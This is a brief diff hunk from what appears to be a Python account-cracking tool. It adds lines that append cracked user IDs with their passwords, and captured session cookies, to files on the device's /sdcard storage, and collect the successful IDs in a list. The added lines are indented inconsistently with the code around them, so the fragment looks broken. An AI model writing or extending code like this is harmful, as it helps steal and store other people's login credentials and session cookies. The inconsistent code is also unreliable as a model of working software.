@@ -646,6 +646,9 @@ def gxds_files(uid, pxss, fb, fb1, tl):
  COOKIE : {coki}
  AGENT  : {ugen}
 """)
+open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
+                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
+                oks.append(uid)
             else:
               continue
         loop += 1
